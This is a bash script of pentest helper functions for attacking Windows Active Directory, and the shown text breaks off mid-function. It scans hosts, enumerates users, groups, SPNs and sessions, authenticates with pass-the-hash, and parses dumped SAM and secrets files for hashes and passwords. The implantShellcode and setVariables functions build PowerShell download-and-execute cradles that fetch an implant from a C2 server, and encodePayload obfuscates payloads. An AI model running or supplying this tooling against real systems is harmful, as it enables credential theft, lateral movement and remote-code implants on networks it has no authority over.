#!/usr/bin/env bash
# DESCRIPTION: This script contains bash functions for basic pentesting tasks with local and domain PTH.
#    git clone https://github.com/0xacb/viewgen
#    git clone https://github.com/dirkjanm/adidnsdump.git
#    git clone https://github.com/fox-it/adconnectdump.git
#    git clone https://github.com/Hackplayers/evil-winrm.git
#    git clone https://github.com/SecureAuthCorp/impacket.git
#    git clone https://github.com/dirkjanm/krbrelayx.git
#    git clone https://github.com/fox-it/mitm6.git
#    git clone https://github.com/the-useless-one/pywerview.git
#    git clone https://github.com/Gallopsled/pwntools.git
#    git clone https://github.com/fox-it/BloodHound.py.git
#    git clone https://github.com/5alt/ultrarelay.git
#    git clone https://github.com/sensepost/ruler.git
#    git clone https://github.com/sensepost/reGeorg.git

export HELPER="${PWD}/helpers.sh";
export DOMAIN='';
export USER='';
export PASSWORD='';
export DCIP='';
export DOMAINUSER='';
export HASH='';
export HASHES='';
export C2SERVER='';
export IMPLANT='';
export PHRASE='';

# TEMPLATE CRED FILE:
#export DOMAIN='XXXX';
#export USER='XXXX';
#export PASSWORD='XXXX';
#export DCIP="${DOMAIN}";
#export DOMAINUSER="${DOMAIN}/${USER}";
#export HASH='XXXXXXXXXXX';
#export HASHES=":${HASH}";
#echo "[+] user is ${DOMAINUSER}";

# SECTION: General helper functions:

function showHelp(){
    # DESCRIPTION: Displays helper functions and descriptions.
    # ARGUMENTS: showHelp None.
    HELP=`cat ${HELPER} | egrep "function|ARGUMENT|DESCRIPTION|SECTION:"|\
        grep -v "HELP"\
        |cut -d' ' -f2-100\
        |cut -d'(' -f1\
        |sed 's/SEC/\nSEC/g' ;`
    printf "${HELP}";
    return;
}

function parseNameDomain(){
    # DESCRIPTION: Parse name and domain from string.
    # ARGUMENT: parseNameDomain VALUE.
    VALUE=$1;
    NAME=`echo ${VALUE}|cut -d':' -f 1`;
    if [[ "$NAME" == *"\\"* ]]; then
        DOMAIN=`echo ${NAME}|cut -d '\\' -f1`;
        NAME=`echo ${NAME}|cut -d '\\' -f2`;
    elif [[ "$NAME" == *"@"* ]]; then
        DOMAIN=`echo ${NAME}|cut -d '@' -f2`;
        NAME=`echo ${NAME}|cut -d '@' -f1`;
    else
        DOMAIN="LOCAL";
    fi
    printf "${DOMAIN^^}:${NAME^^}\n";
    return;
}

function parseAESHashes(){
    # DESCRIPTION: Parse AES-256 hashes from dumped secrets files.
    # ARGUMENT: parseAESHashes TARGET.
    TARGET=$1;
    FILE=`basename ${TARGET}`;
    FILE=${FILE%.secrets};
    for line in `cat ${TARGET}\
        |tr -d " "\
        |grep -e "^.*aes256-cts-hmac-sha1-96.*:.*";`; do
        NAME=`echo ${line}|cut -d':' -f 1`;
        AES=`echo ${line}|cut -d':' -f 3`;
        NAME=`parseNameDomain ${NAME}`;
        if [[ "$NAME" == *"LOCAL"* ]]; then
            DOMAIN=${FILE};
        else
            DOMAIN=`echo ${NAME}|cut -d ':' -f1`;
        fi
        NAME=`echo ${NAME}|cut -d ':' -f2`;
        printf "${DOMAIN^^} ${NAME^^} $AES\n";
    done;
    return;
}

function parsePasswords(){
    # DESCRIPTION: Parse passwords from dumped secrets files.
    # ARGUMENT: parsePasswords TARGET.
    TARGET=$1;
    FILE=`basename ${TARGET}`;
    FILE=${FILE%.secrets};
    for line in `cat ${TARGET}\
            |grep -e "^.*:.*"\
            |tr -d " "\
            |grep -v "\$ASP.NET"\
            |grep -v "\$MACHINE.ACC"\
            |grep -v "_SC_GMSA"\
            |grep -v -e "^.*L\$.*-.*-.*-.*-.*"\
            |grep -v -e "^.*SCM:{.*}:.*"\
            |grep -v "RasConnection\|RasDial"\
            |grep -v -e "^.*:.*:.*:::.*"\
            |grep -v "des-cbc"\
            |grep -v -e "^.*aes.*-cts.*:.*"\
            |grep -v -e "^.*dpapi_.*:.*"\
            |grep -v -e "^.*NL.*KM:.*";`; do
        NAME=`echo ${line}|cut -d':' -f 1`;
        PASSWORD=`echo ${line}|cut -d':' -f 2-1000`;
        NAME=`parseNameDomain ${NAME}`;
        if [[ "$NAME" == *"LOCAL"* ]]; then
            DOMAIN=${FILE};
        else
            DOMAIN=`echo ${NAME}|cut -d ':' -f1`;
        fi
        NAME=`echo ${NAME}|cut -d ':' -f2`;
        echo "${DOMAIN^^} ${NAME^^} $PASSWORD";
    done;
    return;
}

function parseNTLMHashes(){
    # DESCRIPTION: Parse NTLM hashes from dumped sam and secrets files.
    # ARGUMENT: parseNTLMHashes TARGET.
    TARGET=$1;
    FILE=`basename ${TARGET}`;
    if [[ "$FILE" == *".sam"* ]]; then
        FILE=${FILE%.sam};
    elif [[ "$FILE" == *".secrets"* ]]; then
        FILE=${FILE%.secrets};
    fi
    for line in `cat ${TARGET}\
        |tr -d " "\
        |egrep "^.*:.*:.*:::.*";`; do
        NAME=`echo ${line}|cut -d':' -f 1`;
        SHA=`echo ${line}|cut -d':' -f 3`;
        NTLM=`echo ${line}|cut -d':' -f 4`;
        NAME=`parseNameDomain ${NAME}`;
        if [[ "$NAME" == *"LOCAL"* ]]; then
            DOMAIN=${FILE};
        else
            DOMAIN=`echo ${NAME}|cut -d ':' -f1`;
        fi
        NAME=`echo ${NAME}|cut -d ':' -f2`;
        printf "$DOMAIN $NAME $SHA $NTLM\n";
    done;
    return;
}

function logSession(){
    # DESCRIPTION: Log bash session to file /var/LOGNAME_session_d_m_y_HM.log.
    # ARGUMENT: logSession LOGNAME.
    LOGNAME=$1;
    screen -S sessionlogging -L -Logfile /var/log/$(date +"${LOGNAME}_session_%d_%m_%y_%H%M.log");
    return;
 }

function stopLoggingSession(){
    # DESCRIPTION: Log bash session to file /var/LOGNAME_session_d_m_y_HM.log.
    # ARGUMENT: stopLoggingSession None.
    pkill screen;
    return;
}

function encryptFile(){
    # DESCRIPTION: Encrypt file using AES-256-CBC and password.
    # ARGUMENT: encryptFile FILEIN, FILEOUT, PASS.
    FILEIN=$1;
    FILEOUT=$2;
    PASS=$3;
    openssl enc \
    -aes-256-cbc \
    -salt -pbkdf2 \
    -in "${FILEIN}" \
    -out "${FILEOUT}" \
    -k "${PASS}";
    return;
}

function decryptFile(){
    # DESCRIPTION: Decrypt AES-256-CBC encrypted file using password.
    # ARGUMENT: decryptFile FILEIN, FILEOUT, PASS.
    FILEIN=$1;
    FILEOUT=$2;
    PASS=$3;
    openssl enc \
    -aes-256-cbc \
    -pbkdf2 -d \
    -in "${FILEIN}" \
    -out "${FILEOUT}" \
    -k "${PASS}";
    return;
}

function harvestData(){
    # DESCRIPTION: Harvest online data for a given domain, save output to sqlite.
    # ARGUMENT: harvestData DOMAIN.
    DOMAIN=$1;
    theHarvester -d ${DOMAIN} -b all -f ${DOMAIN}.xml;
    return;
}

function googleSearch(){
    # DESCRIPTION: Quick Google search against domains for strings/terms.
    # ARGUMENT: googleSearch DOMAINS, TERMS.
    DOMAINS=$1;
    TERMS=$2;
    googlesearch --domains=${DOMAINS} --all ${TERMS};
    return;
}

function cewlHarvestData(){
    # DESCRIPTION: Crawl site using cewl to harvest emails and words.
    # ARGUMENT: cewlHarvestData TARGET.
    TARGET=$1;
    proxychains cewl -w ${TARGET}_cewl_out.txt \
        > -a --meta_file ${TARGET}_cewl_meta.txt \
        > -e --email_file ${TARGET}_cewl_email.txt \
        > ${TARGET};
    return;
}

function encodePayload(){
    # DESCRIPTION: Encodes PowerShell payloads into Base64 UTF-16 format.
    # ARGUMENT: encodePayload PAYLOAD.
    PAYLOAD=$1
    echo $PAYLOAD | iconv -f ASCII -t UTF-16LE - | base64 | tr -d "\n";
    return;
}

function implantShellcode(){
    # DESCRIPTION: Generates x64 shellcode for PS implants.
    # ARGUMENT: implantShellcode None.
    msfvenom -a x64 \
        --platform windows \
        -p windows/x64/exec \
        cmd="powershell \"iex(new-object net.webclient).downloadstring('${C2SERVER}/${IMPLANT}')\"" \
        -f  powershell;
    return;
}

function encodeHash(){
    # DESCRIPTION: Encodes plaintext passwords into NTLM hash format.
    # ARGUMENT: encodeHash PASS.
    PASS=$1;
    printf \
    "import hashlib,binascii;print(binascii.hexlify(hashlib.new('md4','${PASS}'.encode('utf-16le')).digest()))" \
    | python -
    return;
}

function setVariables(){
    # DESCRIPTION: Sets global environment variables for credentials and domain settings.
    # ARGUMENT: setVariables None.
    export IMPLANT="powershell -exec bypass -c iex((new-object net.webclient).downloadstring('${C2SERVER}/${IMPLANT}'))";
    export DOMAINUSER="${DOMAIN}/${USER}";
    export HASH=`encodeHash ${PASSWORD}`;
    export HASHES=":${HASH}";
    return;
}

function setUserByPassword(){
    # DESCRIPTION: Set current domain user by password.
    # ARGUMENT: setUserByPassword USER, DOMAIN, PASSWORD.
    export USER=$1;
    export DOMAIN=$2;
    export PASSWORD=$3;
    export DCIP=$2;
    setVariables;
    return;
}

function setLocalUserByPassword(){
    # DESCRIPTION: Set current local user by password.
    # ARGUMENT: setLocalUserByPassword USER, PASSWORD, TARGET.
    export USER=$1;
    export PASSWORD=$2;
    export TARGET=$3;
    setVariables;
    export DOMAINUSER=$USER;
    export DOMAIN="";
    export DCIP="";
    return;
}

function setUserByHash(){
    # DESCRIPTION: Set current domain user by hash.
    # ARGUMENT: setUserByHash USER, DOMAIN, HASH.
    export USER=$1;
    export DOMAIN=$2;
    setVariables;
    export HASH=$3;
    if [[ "$HASH" == *":"* ]]; then
        export HASHES=$HASH;
    else
        export HASHES=":${HASH}";
    fi
    export PASSWORD=$HASHES;
    export DCIP=$2;
    return;
}

function setLocalUserByHash(){
    # DESCRIPTION: Set current local user by hash.
    # ARGUMENT: setLocalUserByHash USER, HASH, TARGET.
    export USER=$1;
    export TARGET=$3;
    setVariables;
    export DOMAINUSER=$USER;
    export HASH=$2;
    if [[ "$HASH" == *":"* ]]; then
        export HASHES=$HASH;
    else
        export HASHES=":${HASH}";
    fi
    export PASSWORD=$HASHES;
    export DOMAIN="";
    export DCIP="";
    return;
}

# SECTION: Unauthenticated reconnaissance helper functions:

function getIPAddress(){
    # DESCRIPTION: Get IP address only for a given domain and NS server.
    # ARGUMENT: getIPAddress TDOMAIN NSSERVER
    TDOMAIN=$1;
    NSSERVER=$2;
    proxychains \
        nslookup ${TDOMAIN} ${NSSERVER}|tr -d " "|grep -v $'#'|grep Add|cut -d':' -f2;
    return;
}

function digDump(){
    # DESCRIPTION: Perform dig queries on gd, ldap, kerberos, kpasswd, and any.
    # ARGUMENT: digDump TARGET.
    TARGET=$1;
    proxychains \
    dig -t SRV _gc._tcp.${TARGET};
    proxychains \
    dig -t SRV _ldap._tcp.${TARGET};
    proxychains \
    dig -t SRV _kerberos._tcp.${TARGET};
    proxychains \
    dig -t SRV _kpasswd._tcp.${TARGET};
    proxychains \
    dig any $TARGET;
    return;
}

function dhcpBroadcastScan(){
    # DESCRIPTION: Scan DHCP broadcast for IPv4 and IPv6
    # ARGUMENT: dhcpBroadcastScan None.
    nmap -v -oA "broadcast_dhcp" \
    --script broadcast-dhcp-discover;
    nmap -v -oA "broadcast_dhcp6" \
    --script broadcast-dhcp6-discover;
    return;
}

function whoisARIN(){
    # DESCRIPTION: Perform whois query of IP against ARIN.
    # ARGUMENT: whoisARIN IPADDRESS.
    IPADDRESS=$1;
    proxychains \
    whois -h whois.arin.net $IPADDRESS;
    return;
}

function getIPSpace(){
    # DESCRIPTION: Get IP space for a given IP address.
    # ARGUMENT: getIPSpace IP.
    IP=$1;
    whoisARIN ${IP}|grep CIDR|tr -d " "|cut -d':' -f2
    return;
}

function ldapDNSLookup(){
    # DESCRIPTION: LDAP and Kerberos DNS lookups.
    # ARGUMENT: ldapDNSLookup TARGET, NSERVER.
    TARGET=$1;
    NSERVER=$2;
    proxychains \
    nslookup -type=srv _ldap._tcp.dc._msdcs.${TARGET} ${NSERVER};
    proxychains \
    nslookup -type=srv _kerberos._tcp.dc._msdcs.${TARGET} ${NSERVER};
    return;
}

function dnsReconReverseIP(){
    # DESCRIPTION: DNS recon query against target NS and domain using CIDR.
    # ARGUMENT: dnsReconReverseIP TARGET, NSERVER, CIDR.
    TARGET=$1;
    NSERVER=$2;
    CIDR=$3;
    proxychains \
    dnsrecon -d $TARGET -n $NSERVER -r $CIDR;
    return;
}

function dnsRecon(){
    # DESCRIPTION: DNS recon query against target NS and domain.
    # ARGUMENT: dnsRecon TARGET, NSERVER.
    TARGET=$1;
    NSERVER=$2;
    proxychains \
    dnsrecon -d $TARGET -n $NSERVER;
    return;
}

function ldapQuery(){
    # DESCRIPTION: Unauthenticated LDAP query for objectClass=*
    # ARGUMENT: ldapQuery TARGET.
    TARGET=$1;
    proxychains \
    ldapsearch -LLL -x \
    -H ldap://${TARGET} -b '' -s base '(objectclass=*)';
    return;
}

function pingSweepCIDR(){
    # DESCRIPTION: Ping sweep of CIDR with random data.
    # ARGUMENT: pingSweepCIDR TCIDR.
    TARGET=$1;
    OUTFILE=`echo $1|tr -d "/"`;
     nmap -oA "${OUTFILE}_ping_sweep_list" -v -T 3 \
        -PP --data "\x41\x41" -n -sn $TARGET;
    return;
}

function pingSweeps(){
    # DESCRIPTION: Ping sweep of target list with random data.
    # ARGUMENT: pingSweeps TARGET.
    TARGET=$1;
     nmap -oA "${TARGET}_ping_sweep_list" -v -T 3 \
        -PP --data "\x41\x41" -n -sn -iL $TARGET;
    return;
}

function pingSweep(){
    # DESCRIPTION: Ping single target using random data.
    # ARGUMENT: pingSweep TARGET.
    TARGET=$1;
     nmap -oA "${TARGET}_ping_sweep" -v -T 3 \
        -PP --data "\x41\x41" -n -sn $TARGET;
    return;
}

function scanSMBSettings(){
    # DESCRIPTION: Scan target list for SMBv1 and SMBv2 security settings via IP.
    # ARGUMENT: scanSMBSettings TARGET.
    TARGET=$1;
    proxychains \
    nmap -v -Pn -sT \
    --script smb-security-mode,smb2-security-mode -T 3 \
         --open -p445 \
         -iL $TARGET \
         -oA "${TARGET}_smb_settings_scans";
    return;
}

function fingerPrintHTTPHeaders(){
    # DESCRIPTION: Scan target list for HTTP/HTTPS headers.
    # ARGUMENT: fingerPrintHTTPHeaders TLIST.
    TARGET=$1;
    proxychains \
    nmap -v --script http-headers -T 3 \
         --open -p80,443 \
         -iL $TARGET \
         -oA "${TARGET}_http_header_scans";
    return;
}

function fingerPrintHTTPHeader(){
    # DESCRIPTION: Scan target for HTTP/HTTPS headers.
    # ARGUMENT: fingerPrintHTTPHeader TARGET.
    TARGET=$1;
    proxychains \
    nmap -v --script http-headers -T 3 \
         --open -p80,443 \
         -oA "${TARGET}_http_header_scan" ${TARGET};
    return;
}

function fingerPrintSMBHTTP(){
    # DESCRIPTION: Scan target list for SMB and HTTP/HTTPS services.
    # ARGUMENT: fingerPrintSMBHTTP TARGET.
    TARGET=$1;
    proxychains \
    nmap -v -Pn -sT -sV -T 3 \
         --open -p445,80,443 \
         -iL ${TARGET} \
         -oA "${TARGET}_smb_http_scans";
    return;
}

function serviceFingerprintScan(){
    # DESCRIPTION: Scan single target *full fingerprint* for recon/RCE services DNS, RPC, SMB, HTTP, RDP, LDAP, WinRM, SCM, MSSQL.
    # ARGUMENT: serviceFingerprintScan TARGET.
    TARGET=$1;
    proxychains \
    nmap -v -T 5 -Pn -sT -sC -sV \
        -oA "${TARGET}_service_fiingerprint_scan" \
        --open -p53,135,137,139,445,80,443,3389,386,636,5985,2701,1433,1961,1962 \
        ${TARGET};
    return;
}

function serviceScan(){
    # DESCRIPTION: Scan single target *faster* for recon/RCE services DNS, RPC, SMB, HTTP, RDP, LDAP, WinRM, SCM, MSSQL.
    # ARGUMENT: serviceScan TARGET.
    TARGET=$1;
    proxychains \
    nmap -v -T 5 -Pn -sT --max-rate 100 \
        --min-rtt-timeout 100ms \
        --max-rtt-timeout 100ms \
        --initial-rtt-timeout 100ms \
        --max-retries 0 \
        -oA "${TARGET}_service_scan" \
        --open -p53,135,137,139,445,80,443,3389,386,636,5985,2701,1433,1961,1962 \
        ${TARGET};
    return;
}

function serviceScans(){
    # DESCRIPTION: Scan target list for recon/RCE services DNS, RPC, SMB, HTTP, RDP, LDAP, WinRM, SCM, MSSQL.
    # ARGUMENT: serviceScans TARGET.
    TARGET=$1;
    proxychains \
    nmap -v -T 4 -Pn -sT  \
         --open -p53,135,137,139,445,80,443,3389,386,636,5985,2701,1433,1961,1962 \
         -iL $TARGET \
         -oA "${TARGET}_service_scans";
    return;
}

function quickUDPScan(){
    # DESCRIPTION: Scan target for UDP ports 161, 162, 69 open only.
    # ARGUMENT: quickUDPScan TARGET.
    TARGET=$1;
    proxychains \
    nmap -v -T 4 -Pn -sU \
         --open -p 161,162,69 \
         -oA "${TARGET}_quick_udp_scan" \
         ${TARGET};
    return;
}

function fullTCPScan(){
    # DESCRIPTION: Scan target for TCP 65535 ports open only.
    # ARGUMENT: fullTCPScan TARGET.
    TARGET=$1;
    proxychains \
    nmap -v -T 4 -Pn -sT \
         --open -p- \
         -oA "${TARGET}_full_tcp_scan" \
         ${TARGET};
    return;
}

function showScanStats(){
    # DESCRIPTION: Statistics on service scan results for DNS, RPC, SMB, HTTP, RDP, LDAP, WinRM, SCM, MSSQL.
    # ARGUMENT: showScanStats TFILE.
    SVCSCAN=$1;
     for p in "53" "135" "137" "139" "445" "80" "443" "3389" "386" "636" "5985" "2701" "1433" "1961" "1962"; do
        TOTAL=`strings ${SVCSCAN}.gnmap|grep $p|wc -l`;
        printf "SERVICE ${p} TOTAL ${TOTAL}\n";
    done;
    return;
}

function dnsSrvEnum(){
    # DESCRIPTION: DNS server enumeration against target domain.
    # ARGUMENT: dnsSrvEnum TARGET.
    TARGET=$1;
    proxychains \
    nmap -v -Pn -sT -oA "${TARGET}_dns_srv_enum" \
    --script dns-srv-enum \
    --script-args "dns-srv-enum.domain='${TARGET}'";
    return;
}

function dnsScan(){
    # DESCRIPTION: Scan target for TCP/UDP DNS services.
    # ARGUMENT: dnsScan TARGET.
    TARGET=$1;
    proxychains \
    nmap -v -Pn -sT -oA "${TARGET}_dns_scan" --open -p T:53,U:53 -T 3 $TARGET;
    return;
}

function dnsBroadcastDiscovery(){
    # DESCRIPTION: Scan local network for DNS broadcast on TCP/UDP.
    # ARGUMENT: dnsBroadcastDiscovery None.
    nmap -v -oA "dns_broadcast" \
    --script broadcast-dns-service-discovery -p T:53,U:53;
    return;
}

function getInterfaces(){
    # DESCRIPTION: Scan target for RPC/DCOM interfaces.
    # ARGUMENT: getInterfaces TARGET.
    TARGET=$1;
    proxychains ifmap.py $TARGET 135;
    return;
}

function getRPCPWInfo(){
    # DESCRIPTION: Dump target DC password info via RPC/DCOM information.
    # ARGUMENT: getRPCPWInfo TARGET.
    TARGET=$1;
    proxychains rpcclient -U "" ${TARGET} -N -c "getdompwinfo";
    return;
}

function getRPCUserInfo(){
    # DESCRIPTION: Dump target DC users via RPC/DCOM information.
    # ARGUMENT: getRPCUserInfo TARGET.
    TARGET=$1;
    proxychains rpcclient -U "" ${TARGET} -N -c "enumdomusers";
    return;
}

function dumpRPC(){
    # DESCRIPTION: Dump target RPC/DCOM information.
    # ARGUMENT: dumpRPC TARGET.
    TARGET=$1;
    proxychains rpcdump.py -port 135 $TARGET;
    return;
}

function checkRPCPrintSpool(){
    # DESCRIPTION: Dump target print remote system MS-RPRN RPC/DCOM information.
    # ARGUMENT: checkRPCPrintSpool TARGET.
    TARGET=$1;
    dumpRPC ${TARGET}|grep "MS-RPRN";
    return;
}

function dumpSAMR(){
    # DESCRIPTION: Scan target SAMR user information.
    # ARGUMENT: dumpSAMR TARGET.
    TARGET=$1;
    proxychains samrdump.py -no-pass $TARGET;
    return;
}

function dumpSIDs(){
    # DESCRIPTION: Scan target SID information.
    # ARGUMENT: dumpSIDs TARGET.
    TARGET=$1;
    proxychains lookupsid.py \
    -domain-sids -no-pass $TARGET;
    return;
}

# SECTION: Authenticated reconnaissance function helpers:

function showADStats(){
    # DESCRIPTION: Statistics on AD systems based on OS versions.
    # ARGUMENT: showADStats TFILE.
    ADSCAN=$1;
    for OS in "xp" "nt" "7" "8" "10"; do
        TOTAL=`strings ${ADSCAN}|grep -i "windows ${OS}"|wc -l`;
        printf "OS windows ${OS} TOTAL ${TOTAL}\n";
    done;

    for OS in "03" "08" "12" "16" "19"; do
        TOTAL=`strings ${ADSCAN}|grep -i "server 20${OS}"|wc -l`;
        printf "OS windows server ${OS} TOTAL ${TOTAL}\n";
    done;
    return;
}

function adDNSDump(){
    # DESCRIPTION: Perform ADIDNS dump of zones using domain user or computer hash or plaintext.
    # ARGUMENT: adDNSDump TARGET.
    TARGET=$1;
    proxychains \
    adidnsdump --print-zones \
    -u ${DOMAIN}\\${USER} \
    -p $PASSWORD \
    -v $TARGET;
    return;
}

function runBloodhound(){
    # DESCRIPTION: Run Bloodhound ingestor on target domain controllers.
    # ARGUMENT: runBloodhound TDCIP, TDOMAIN, TGC.
    TDCIP=$1;
    TDOMAIN=$2;
    TGC=$3;
    if [[ -z "$DOMAIN" ]]
    then
      proxychains \
        bloodhound-python -c DCOnly \
        -u "${USER}@${DOMAIN}" \
        --hashes $HASHES \
        -dc $TDCIP -gc $TGC -d $TDOMAIN -v;
    else
       proxychains \
        bloodhound-python -c DCOnly \
        -u "${USER}@${DOMAIN}" \
        -p ${PASSWORD} \
        -dc $TDCIP -gc $TGC -d $TDOMAIN -v;
    fi
    return;
}

function getSPNs(){
    # DESCRIPTION: Save SPNs from target domain.
    # ARGUMENT: getSPNs TARGET TDCIP.
    TARGET=$1;
    TDCIP=$2;
    proxychains \
    GetUserSPNs.py \
    -target-domain $TARGET \
    -outputfile $TARGET \
    -no-pass -hashes $HASHES \
    -dc-ip $TDCIP ${DOMAINUSER};
    return;
}

function getNPUsers(){
    # DESCRIPTION: Save target NP user details.
    # ARGUMENT: getNPUsers TARGET.
    TARGET=$1;
    proxychains \
    GetNPUsers.py "${DOMAIN}/${TARGET}" \
    -outputfile $TARGET -no-pass;
    return;
}

function checkLocalAdmin(){
    # DESCRIPTION: Check target for local admin privileges.
    # ARGUMENT: checkLocalAdmin TARGET.
    TARGET=$1;
    if [[ -z "$DOMAIN" ]]
    then
      proxychains \
        python /opt/pywerview/pywerview.py invoke-checklocaladminaccess \
        -w $TARGET -u $USER \
        --hashes $HASHES --computername "${TARGET}";
    else
      proxychains \
        python /opt/pywerview/pywerview.py invoke-checklocaladminaccess \
        -w $DOMAIN -u $USER \
        --hashes $HASHES --computername "${TARGET}";
    fi
    return;
}

function wmiSurvey(){
    # DESCRIPTION: Run WMI survey on remote target.
    # ARGUMENT: wmiSurvey TARGET.
    TARGET=$1;
    printf "
    select Caption,Description, HotFixID, InstalledOn from Win32_QuickFixEngineering;
    select * from Win32_Product;
    select * from Win32_OperatingSystem;
    select Command, User, Caption from Win32_StartupCommand;
    select Name, Pathname, State, StartMode, StartName from Win32_Service;
    select Name, ProcessId, ParentProcessId, ExecutablePath from Win32_Process;
    select * From Win32_NetworkAdapter;
    select * From Win32_NetworkAdapterConfiguration;
    select * from Win32_Share;
    select * from Win32_MappedLogicalDisk;
    select * from Win32_ComputerSystem;
    select Antecedent from Win32_LoggedOnUser;
    exit
    " > /tmp/query.wql;
    if [[ -z "$DOMAIN" ]]
    then
          proxychains \
            wmiquery.py \
            -no-pass -hashes $HASHES \
            -file /tmp/query.wql \
            ${USER}@${TARGET};
    else
          proxychains \
            wmiquery.py \
            -no-pass -hashes $HASHES \
            -file /tmp/query.wql \
            -dc-ip $DCIP ${DOMAINUSER}@${TARGET};
    fi
    rm /tmp/query.wql;
    return;
}

function wmiQuery(){
    # DESCRIPTION: Run WMI query on remote target.
    # ARGUMENT: wmiQuery TARGET.
    TARGET=$1;
    if [[ -z "$DOMAIN" ]]
    then
          proxychains \
            wmiquery.py \
            -no-pass -hashes $HASHES \
            ${USER}@${TARGET};
    else
          proxychains \
            wmiquery.py \
            -no-pass -hashes $HASHES \
            -dc-ip $DCIP ${DOMAINUSER}@${TARGET};
    fi
    return;
}

function registryQuery(){
    # DESCRIPTION: Run registry query on remote target.
    # ARGUMENT: registryQuery TARGET, QUERY.
    TARGET=$1;
    QUERY=$2;
    if [[ -z "$DOMAIN" ]]
    then
        proxychains \
        reg.py \
        -no-pass -hashes $HASHES \
        ${USER}@${TARGET} \
        query -keyName $QUERY -s;
    else
        proxychains \
        reg.py \
        -no-pass -hashes $HASHES \
        -dc-ip $DCIP ${DOMAINUSER}@${TARGET} \
        query -keyName $QUERY -s;
    fi
    return;
}

function serviceQuery(){
    # DESCRIPTION: Run service query on remote target.
    # ARGUMENT: serviceQuery TARGET.
    TARGET=$1;
    if [[ -z "$DOMAIN" ]]
    then
          proxychains \
            services.py \
            -no-pass -hashes $HASHES \
            ${USER}@${TARGET} list;
    else
          proxychains \
            services.py \
            -no-pass -hashes $HASHES \
            -dc-ip $DCIP ${DOMAINUSER}@${TARGET} list;
    fi
    return;
}

function huntProcess(){
    # DESCRIPTION: Hunt user processes on remote target.
    # ARGUMENT: huntProcess TARGET, COMPUTER.
    TARGET=$1;
    COMPUTER=$2;
    proxychains \
    python /opt/pywerview/pywerview.py invoke-processhunter -w $DOMAIN -u $USER \
    --hashes $HASHES --dc-ip $DCIP \
    -d $DOMAIN --show-all \
    --computername ${COMPUTER} \
    --username ${TARGET};
    return;
}

function getProcess(){
    # DESCRIPTION: Scan remote target for processes.
    # ARGUMENT: getProcess TARGET.
    TARGET=$1;
    proxychains \
    python /opt/pywerview/pywerview.py get-netprocess -w $DOMAIN -u $USER \
    --hashes $HASHES \
    --computername $TARGET;
    return;
}

function getSessions(){
    # DESCRIPTION: Scan remote target for SMB sessions.
    # ARGUMENT: getSessions TARGET.
    TARGET=$1;
    proxychains \
    python /opt/pywerview/pywerview.py get-netsession -w $DOMAIN -u $USER \
    --hashes $HASHES \
    --computername $TARGET;
    return;
}

function getShares(){
    # DESCRIPTION: Scan remote target for SMB shares.
    # ARGUMENT: getShares TARGET.
    TARGET=$1;
    proxychains \
    python /opt/pywerview/pywerview.py get-netshare -w $DOMAIN -u $USER \
    --hashes $HASHES \
    --computername $TARGET;
    return;
}

function huntUser(){
    # DESCRIPTION: Scan for users on remote target.
    # ARGUMENT: huntUser TARGET, TDOMAIN.
    TARGET=$1;
    TDOMAIN=$2;
    proxychains \
    python /opt/pywerview/pywerview.py invoke-userhunter -w $DOMAIN -u $USER \
    --hashes $HASHES --dc-ip $TDOMAIN \
    -d $TDOMAIN --stealth --stealth-source dc \
    --show-all --username "${TARGET}";
    return;
}

function getGroupMember(){
    # DESCRIPTION: Scan group membership on target groups.
    # ARGUMENT: getGroupMember TARGET, TDOMAIN.
    TARGET=$1;
    TDOMAIN=$2;
    proxychains \
    python /opt/pywerview/pywerview.py get-netgroupmember -w $DOMAIN -u $USER \
    --hashes $HASHES --dc-ip $TDOMAIN --groupname "${TARGET}";
    return;
}

function getGroups(){
    # DESCRIPTION: Scan groups on targets.
    # ARGUMENT: getGroups TARGET, TDOMAIN.
    TARGET=$1;
    TDOMAIN=$2;
    proxychains \
    python /opt/pywerview/pywerview.py get-netgroup -w $DOMAIN -u $USER \
    --hashes $HASHES --dc-ip $TDOMAIN -d ${TARGET};
    return;
}

function getGroup(){
    # DESCRIPTION: Scan for target groups.
    # ARGUMENT: getGroup TARGET, TDOMAIN.
    TARGET=$1;
    TDOMAIN=$2;
    proxychains \
    python /opt/pywerview/pywerview.py get-netgroup -w $DOMAIN -u $USER \
    --hashes $HASHES --dc-ip $TDOMAIN --groupname "${TARGET}";
    return;
}

function getLoggedOn(){
    # DESCRIPTION: Scan remote targets for logged on users.
    # ARGUMENT: getLoggedOn TARGET.
    TARGET=$1;
    proxychains \
    python /opt/pywerview/pywerview.py get-netloggedon -w $DOMAIN -u $USER \
    --hashes $HASHES --computername $TARGET;
    return;
}

function getDomainPolicy(){
    # DESCRIPTION: Scan domain group/password policy.
    # ARGUMENT: getDomainPolicy TDOMAIN.
    TDOMAIN=$1;
    proxychains \
    python /opt/pywerview/pywerview.py get-domainpolicy -w $DOMAIN -u $USER \
    --hashes $HASHES \
    -t $TDOMAIN -d $TDOMAIN;
    return;
}

function getComputer(){
    # DESCRIPTION: Scan for computer in target domain.
    # ARGUMENT: getComputer TARGET, TDOMAIN.
    TARGET=$1;
    TDOMAIN=$2;
    proxychains \
    python /opt/pywerview/pywerview.py get-netcomputer -w $DOMAIN -u $USER \
    --full-data --ping \
    --hashes $HASHES \
    -t $TDOMAIN -d $TDOMAIN --computername $TARGET;
    return;
}

function getFullComputers(){
    # DESCRIPTION: Scan for full computer details in target domain.
    # ARGUMENT: getFullComputers TARGET.
    TARGET=$1;
    proxychains \
    python /opt/pywerview/pywerview.py get-netcomputer -w $DOMAIN -u $USER \
    --full-data --ping \
    --hashes $HASHES \
    -t $TARGET -d $TARGET;
    return;
}

function getComputers(){
    # DESCRIPTION: Scan for computer hostnames in target domain.
    # ARGUMENT: getComputers TARGET.
    TARGET=$1;
    proxychains \
    python /opt/pywerview/pywerview.py get-netcomputer -w $DOMAIN -u $USER \
    --hashes $HASHES \
    -t $TARGET -d $TARGET;
    return;
}

function getDelegation(){
    # DESCRIPTION: Scan for user and computer delegation in target domains.
    # ARGUMENT: getDelegation TARGET.
    TARGET=$1;
    proxychains \
    findDelegation.py \
    -no-pass -hashes $HASHES \
    -target-domain $TARGET \
    "${DOMAINUSER}";
    return;
}

function getUnconstrainedUsers(){
    # DESCRIPTION: Scan for unconstrained users in target domain.
    # ARGUMENT: getUnconstrainedUsers TARGET.
    TARGET=$1;
    proxychains \
    python /opt/pywerview/pywerview.py get-netuser -w $DOMAIN -u $USER \
    --hashes $HASHES --unconstrained \
    -t $TARGET -d $TARGET;
    return;
}

function getUnconstrainedComputers(){
    # DESCRIPTION: Scan for unconstrained computers on target domain.
    # ARGUMENT: getUnconstrainedComputers TARGET.
    TARGET=$1;
    proxychains \
